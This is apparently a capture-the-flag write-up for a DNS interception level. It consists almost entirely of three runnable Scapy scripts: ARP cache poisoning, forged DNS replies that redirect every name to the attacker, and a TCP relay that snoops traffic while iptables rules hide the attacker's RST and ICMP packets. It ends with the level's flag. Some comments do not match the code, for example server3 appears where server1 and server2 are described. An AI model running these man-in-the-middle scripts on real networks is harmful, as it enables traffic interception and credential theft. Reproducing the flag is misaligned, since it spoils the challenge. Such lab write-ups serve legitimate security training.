# Netpirate level 5 / DNS interception

**Author:** [KptCheeseWhiz](https://github.com/KptCheeseWhiz)

## Write-up

### Terminal 1

Poison the ARP table of both server1 and server2 to impersonnate the DNS server.

```python
from scapy.all import *
from time import sleep

def system(cmd):
  from os import popen
  with popen(f"{cmd} 2>&1") as p:
    return p.read().strip()

hwaddr_entrypoint=get_if_hwaddr("eth0")

# Retreive IP addresses of server1 and server2
ipaddr_server1, ipaddr_server3=system("getent hosts server1 server3 | awk '{print $1}'").split("\n")

def arp_spoof(ip_target, ip_spoof, hw_attacker):
  send(
    ARP(
      op=2,
      pdst=ip_target,
      psrc=ip_spoof,
      hwdst=hw_attacker
    ), verbose=0
  )

print("[*] Sending spoofed ARP packets")
while True:
  arp_spoof(
    ip_target=ipaddr_server1,
    ip_spoof=ipaddr_server3,
    hw_attacker=hwaddr_entrypoint
  )
  print(".", end="", flush=True)
  sleep(1)
```

### Terminal 2

Reply to DNS queries with our server as the IP.

```python
from scapy.all import *

import socket

def system(cmd):
  from os import popen
  with popen(f"{cmd} 2>&1") as p:
    return p.read().strip()

ipaddr_entrypoint=get_if_addr("eth0")
hwaddr_entrypoint=get_if_hwaddr("eth0")

def sniff_dns(packet):
  if not packet.haslayer(DNSQR):
    return

  # Ignore our own packets
  if packet[Ether].src == hwaddr_entrypoint:
    return

  sendp(
    Ether(
      src=hwaddr_entrypoint,
      dst=packet[Ether].src
    ) /
    IP(
      src=packet[IP].dst,
      dst=packet[IP].src
    ) /
    UDP(
      dport=packet[UDP].sport,
      sport=packet[UDP].dport
    ) /
    DNS(
      id=packet[DNS].id,
      qd=packet[DNS].qd,
      aa=1,
      rd=0,
      qr=1,
      qdcount=1,
      ancount=1,
      nscount=0,
      arcount=0,
      ar=DNSRR(
          rrname=packet[DNS].qd.qname,
          type="A",
          ttl=600,
          # Put our IP as the response
          rdata=ipaddr_entrypoint
        )
    ), verbose=0
  )

  print(f"[+] Replied to a DNS request for '{packet[DNS].qd.qname[:-1].decode()}' from {packet[IP].src}")

# Block destination unreachable icmp packets
system(f"iptables -I OUTPUT -p icmp --icmp-type destination-unreachable -s {ipaddr_entrypoint} -j DROP")
try:
  print("[*] Replying to DNS requests")
  sniff(prn=sniff_dns, filter="udp and port 53", store=False)
finally:
  system(f"iptables -D OUTPUT -p icmp --icmp-type destination-unreachable -s {ipaddr_entrypoint} -j DROP")
```

### Terminal 3

Forward and snoop on all TCP traffic to receive the flag.

```python
from scapy.all import *
from time import time

def system(cmd):
  from os import popen
  with popen(f"{cmd} 2>&1") as p:
    return p.read().strip()

# This function returns the IP and HW addresses of a given hostname
def get_host_addrs(host):
  system(f"while ! ping -c 1 {host} >/dev/null; do sleep 1; done")
  ipaddr_host = system(f"getent hosts {host} | awk '{{print $1}}' ")
  hwaddr_host = system(f"arp -na | awk '/{ipaddr_host}/{{print $4}}'")
  return (ipaddr_host, hwaddr_host)

ipaddr_entrypoint=get_if_addr("eth0")
hwaddr_entrypoint=get_if_hwaddr("eth0")
ipaddr_server1, hwaddr_server1 = get_host_addrs("server1")
ipaddr_server2, hwaddr_server2 = get_host_addrs("server2")

tcp_marks = {}
forward_table = {
  ipaddr_server1: (ipaddr_server2, hwaddr_server2),
  ipaddr_server2: (ipaddr_server1, hwaddr_server1)
}

def sniff_tcp(packet):
  # Ignore packets from ourselve
  if packet[Ether].src == hwaddr_entrypoint:
    return

  # Ignore packets we do not know where to forward
  if packet[IP].src not in forward_table:
    return

  ipaddr_fw, hwaddr_fw = forward_table[packet[IP].src]

  # Avoid reforwarding packets already forwarded
  tcp_mark = f"{packet[TCP].seq}:{packet[TCP].flags}"
  if tcp_mark in tcp_marks:
    return
  tcp_marks[tcp_mark] = time()

  # Print flag contained in the packets
  if packet.haslayer(Raw):
    data = packet[Raw].load.decode().strip()
    if data.startswith("flag-"):
      print(f"[+] {data}")

  # Clear the TCP checksum to let scapy calculate the right one
  del packet[TCP].chksum

  # Send the packet with correct Ether and IP layers
  sendp(
    Ether(
      src=hwaddr_entrypoint,
      dst=hwaddr_fw
    ) /
    IP(
      src=ipaddr_entrypoint,
      dst=ipaddr_fw
    ) /
    packet[TCP],
    verbose=0
  )

# Block the kernel from sending RST/Port closed packets
system(f"iptables -I OUTPUT -p tcp --tcp-flags RST RST -s {ipaddr_entrypoint} -j DROP")
try:
  print(f"[*] Sniffing TCP packets")
  sniff(prn=sniff_tcp, filter="tcp", store=False)
finally:
  system(f"iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {ipaddr_entrypoint} -j DROP")
```

## Flag

`flag-7b7fa4c1a75a2e95f3f9aa8a5307af8412c0f76847710ba04f08a642d0909fb5`
